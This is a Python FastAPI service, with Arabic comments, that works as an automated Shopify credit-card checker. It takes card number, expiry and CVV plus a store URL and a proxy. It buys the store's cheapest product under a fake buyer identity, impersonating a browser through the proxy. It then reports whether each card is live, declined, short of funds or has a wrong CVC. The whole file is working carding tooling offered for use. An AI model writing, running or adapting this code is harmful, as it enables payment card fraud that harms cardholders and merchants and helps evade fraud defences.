from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import uuid
import random
import asyncio

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    """تشفير الكلمات لتجنب حذف البروكسي"""
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_absolute_cheapest_product(session, store_url):
    """محرك كاسح يسحب 250 منتج لضمان أرخص سعر قطعي"""
    try:
        res = await session.get(f"{store_url}/products.json?limit=250", headers={"Accept": "application/json"})
        if res.status_code != 200: return None, "-"
        data = res.json()
        
        valid_variants = []
        for prod in data.get('products', []):
            for var in prod.get('variants', []):
                if var.get('available'):
                    try:
                        p = float(var.get('price', 0))
                        if p > 10000: p = p / 100.0  # معالجة نظام السنتات
                        if p > 0:
                            valid_variants.append((var.get('id'), p))
                    except: pass
        
        if valid_variants:
            # ترتيب المنتجات من الأرخص للأغلى
            valid_variants.sort(key=lambda x: x[1])
            best_vid, lowest_price = valid_variants[0]
            return str(best_vid), "{:.2f}".format(lowest_price)
            
        return None, "-"
    except: return None, "-"

def extract_classic_token(html_text):
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'<meta\s+name="csrf-token"\s*content="([^"]+)"'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: return match.group(1)
    return None

def extract_gateway(html_text):
    patterns = [
        r'name="checkout\[payment_gateway\]"\s*type="radio"\s*value="(\d+)"',
        r'value="(\d+)"\s*name="checkout\[payment_gateway\]"'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: return match.group(1)
    return "1"

async def check_shopify_dual_engine(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Auto")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        scope_host = store_url.replace("https://", "").replace("http://", "")
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        buyer = {
            "email": f"david.smith{random.randint(1000,9999)}@gmail.com", "first_name": "David", "last_name": "Smith",
            "address1": "123 Main Street", "city": "New York", "province": "NY", "zip": "10001",
            "country": "US", "phone": "2125551234"
        }

        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            # 1. جلب أرخص منتج حرفياً
            variant_id, price = await get_absolute_cheapest_product(session, store_url)
            if not variant_id: return safe_response("No available items in stock", "-", "Shopify Auto")

            # 2. الإضافة للسلة
            await session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1})
            
            # 3. فتح صفحة الدفع وتحديد نوع حماية الموقع (الذكاء الاصطناعي للسكربت)
            res_chk = await session.get(f"{store_url}/checkout", allow_redirects=True)
            html_chk = res_chk.text
            final_url = str(res_chk.url)

            if "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return safe_response("Cloudflare Blocked IP", price, "Shopify Auto")

            from html import unescape
            is_graphql_mode = False
            session_token = None
            checkout_token = None
            
            # كشف نظام 2025 (Extensibility)
            meta_match = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
            if meta_match and '/checkouts/cn/' in final_url:
                is_graphql_mode = True
                session_token = unescape(meta_match.group(1)).strip('"')
                checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]

            # --- تشفير البطاقة (مطلوب في كلا النظامين) ---
            card_payload = {
                "credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']},
                "payment_session_scope": scope_host
            }
            res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json=card_payload, headers={"Origin": "https://checkout.pci.shopifyinc.com"})
            if res_pci.status_code != 200: return safe_response("Gateway Blocked IP (Stripe)", price, "Shopify Auto")
            card_session_id = res_pci.json().get("id")
            if not card_session_id: return safe_response("Tokenization Failed", price, "Shopify Auto")

            # =================================================================
            # المسار الأول: مسار GraphQL الحديث (مستوحى من neww.py)
            # =================================================================
            if is_graphql_mode:
                gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
                gql_headers = {
                    'shopify-checkout-client': 'checkout-web/1.0',
                    'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                    'x-checkout-web-source-id': checkout_token,
                    'x-checkout-one-session-token': session_token,
                }
                merch_id = str(uuid.uuid4())
                addr_data = {"address1": buyer["address1"], "city": buyer["city"], "countryCode": buyer["country"], "firstName": buyer["first_name"], "lastName": buyer["last_name"], "zoneCode": buyer["province"], "postalCode": buyer["zip"], "phone": buyer["phone"]}
                
                # إرسال التفاوض
                prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
                prop_vars = {
                    "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}},
                    "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]},
                    "sessionInput": {"sessionToken": session_token}
                }

                res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
                queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
                if not queue_token: return safe_response("GraphQL Proposal Failed", price, "Shopify Auto (GQL)")

                await asyncio.sleep(1)

                # الإرسال النهائي
                submit_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
                submit_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
                submit_vars = {
                    "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
                    "input": {
                        "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
                        "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                        "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                        "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}},
                        "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
                    }
                }

                res_sub = await session.post(submit_url, json={"operationName": "SubmitForCompletion", "query": submit_query, "variables": submit_vars}, headers=gql_headers)
                sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
                if sub_data.get('__typename') == 'SubmitRejected':
                    errs = sub_data.get('errors', [])
                    msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
                    return safe_response(msg, price, "Shopify Auto (GQL)")
                
                receipt_id = sub_data.get('receipt', {}).get('id')
                if not receipt_id: return safe_response("Completion Failed", price, "Shopify Auto (GQL)")

                # فحص الرد
                poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}}}...on ActionRequiredReceipt{id}}}"""
                
                for _ in range(6):
                    res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                    if res_poll.status_code == 200:
                        poll_data = res_poll.json().get('data', {}).get('receipt', {})
                        p_type = poll_data.get('__typename')
                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify Auto (GQL)")
                        elif p_type == 'FailedReceipt':
                            err_code = poll_data.get('processingError', {}).get('code', 'DECLINED')
                            if "INSUFFICIENT" in err_code: return safe_response("Insufficient Funds", price, "Shopify Auto (GQL)")
                            elif "CVC" in err_code: return safe_response("Incorrect CVC", price, "Shopify Auto (GQL)")
                            elif "ZIP" in err_code or "ADDRESS" in err_code: return safe_response("ZIP Code Mismatch", price, "Shopify Auto (GQL)")
                            elif "DO_NOT_HONOR" in err_code: return safe_response("Do Not Honor", price, "Shopify Auto (GQL)")
                            return safe_response(f"Declined: {err_code}", price, "Shopify Auto (GQL)")
                    await asyncio.sleep(1.5)
                return safe_response("Timeout waiting for Bank", price, "Shopify Auto (GQL)")

            # =================================================================
            # المسار الثاني: المسار الكلاسيكي (للمتاجر القديمة)
            # =================================================================
            else:
                classic_token = extract_classic_token(html_chk)
                if not classic_token: return safe_response("Token Not Found (Classic)", price, "Shopify Auto (Classic)")

                addr_payload = {
                    "_method": "patch", "authenticity_token": classic_token, "previous_step": "contact_information", "step": "shipping_method",
                    "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"],
                    "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"],
                    "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]
                }
                res_addr = await session.post(final_url, data=addr_payload, allow_redirects=True)
                classic_token2 = extract_classic_token(res_addr.text) or classic_token

                ship_payload = {"_method": "patch", "authenticity_token": classic_token2, "previous_step": "shipping_method", "step": "payment_method"}
                res_ship = await session.post(str(res_addr.url), data=ship_payload, allow_redirects=True)
                classic_token3 = extract_classic_token(res_ship.text) or classic_token2
                gateway_id = extract_gateway(res_ship.text)

                pay_payload = {
                    "_method": "patch", "authenticity_token": classic_token3, "previous_step": "payment_method", "step": "",
                    "s": card_session_id, "checkout[payment_gateway]": gateway_id, "checkout[credit_card][vault]": "false", "complete": "1"
                }
                res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True)
                result_html = res_pay.text.lower()

                if "thank you" in result_html or "order completed" in result_html or res_pay.url.endswith('/thank_you'): return safe_response("Order completed 💎", price, "Shopify Auto (Classic)")
                elif "insufficient" in result_html: return safe_response("Insufficient Funds", price, "Shopify Auto (Classic)")
                elif "incorrect_cvc" in result_html or "security code" in result_html: return safe_response("Incorrect CVC", price, "Shopify Auto (Classic)")
                elif "zip code does not match" in result_html or "avs" in result_html: return safe_response("ZIP Code Mismatch", price, "Shopify Auto (Classic)")
                elif "do not honor" in result_html: return safe_response("Do Not Honor", price, "Shopify Auto (Classic)")
                else:
                    err_match = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                    if err_match: return safe_response(err_match.group(1).strip(), price, "Shopify Auto (Classic)")
                    return safe_response("Declined / Custom Gate", price, "Shopify Auto (Classic)")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify Auto API")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify_dual_engine(cc, url, proxy)
    return JSONResponse(content=result)
